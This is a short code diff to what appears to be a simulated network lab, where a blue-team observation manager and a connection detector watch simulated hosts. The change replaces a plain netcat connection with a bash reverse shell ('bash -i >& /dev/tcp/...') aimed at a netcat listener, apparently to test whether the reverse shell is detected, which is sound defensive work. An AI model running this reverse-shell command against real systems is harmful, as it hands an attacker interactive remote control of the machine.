@@ -47,9 +47,9 @@ def main():
         pprint(blue_mgr.get_observations())
         print("---------------------------------------------------------")
 
-        user1.cmd("nc -lvnp 4444 &")
+        user0.cmd("nc -lvnp 4444 &")
         sleep(2)
-        user0.cmd("nc 10.0.0.2 4444 &")
+        user1.cmd("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &")
         print("------------------------------------------------------------")
         connection_detector.detect(env.net.get('user0'))
         pprint(blue_mgr.get_observations())
